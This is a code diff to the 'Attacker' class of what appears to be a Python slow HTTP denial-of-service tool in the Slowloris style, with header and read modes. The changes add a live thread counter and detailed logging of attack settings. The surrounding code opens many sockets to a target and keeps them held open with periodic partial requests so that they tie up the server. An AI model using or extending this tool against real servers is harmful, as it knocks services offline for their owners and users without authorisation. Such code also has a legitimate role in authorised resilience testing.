@@ -21,6 +21,7 @@ class Attacker:
     def __init__(self, sockets, mode, host, port, path, sleeptime, https, randuseragent, window):
         self.lock = threading.Lock()
         self.is_stopped = False
+        self.thread_cnt = 0
 
         self.sockets = sockets
         self.mode = mode
@@ -81,13 +82,16 @@ class Attacker:
         while True:
             with self.lock:
                 if self.is_stopped:
+                    self.thread_cnt -= 1
                     sys.exit(0)
 
             try:
                 logging.debug("Creating socket...")
                 s = self.init_socket()
             except socket.error as e:
-                logging.debug(e)
+                logging.error(e)
+                with self.lock:
+                    self.thread_cnt -= 1
                 break
 
             try:
@@ -95,6 +99,7 @@ class Attacker:
                     with self.lock:
                         if self.is_stopped:
                             s.close()
+                            self.thread_cnt -= 1
                             sys.exit(0)
                     logging.debug("Sending a beat...")
                     if self.mode == Mode.HEADER:
@@ -105,7 +110,7 @@ class Attacker:
                     logging.debug("Sleeping for %d seconds", self.sleeptime)
                     time.sleep(self.sleeptime)
             except socket.error:
-                print('The connection is closed. Gonna recreate.')
+                logging.debug('The connection is closed. Gonna recreate.')
                 continue
 
     def attack(self):
@@ -113,14 +118,31 @@ class Attacker:
         使用 sockets 个线程发起攻击
         """
         try:
+            logging.info('Starting Slow HTTP Attacker...')
+            logging.info('sockets: %d' % self.sockets)
+            logging.info('mode: %s' % self.mode.name)
+            logging.info('host: %s' % self.host)
+            logging.info('port: %d' % self.port)
+            logging.info('path: %s' % self.path)
+            logging.info('HTTPS: %s' % self.https.__str__())
+            logging.info('sleeptime: %d' % self.sleeptime)
+            logging.info('randuseragent: %s' % self.randuseragent.__str__())
+            if self.mode == Mode.READ:
+                logging.info('window: %d' % self.window)
             thread_pool = []
+            self.thread_cnt = self.sockets
+            thread_cnt = self.thread_cnt
             for i in range(0, self.sockets):
                 thread_pool.append(threading.Thread(target=self._single_attack, args=()))
                 thread_pool[i].start()
             while True:
-                time.sleep(0.5)
+                print('\rRemaining threads: %d' % thread_cnt, end='')
+                time.sleep(5)
+                with self.lock:
+                    thread_cnt = self.thread_cnt
         except (KeyboardInterrupt, SystemExit):
             with self.lock:
                 self.is_stopped = True
-            print('Stopping Slow HTTP Attacker...')
+            print()
+            logging.info('Stopping Slow HTTP Attacker. Please wait at most %d seconds...' % self.sleeptime)
             sys.exit(0)
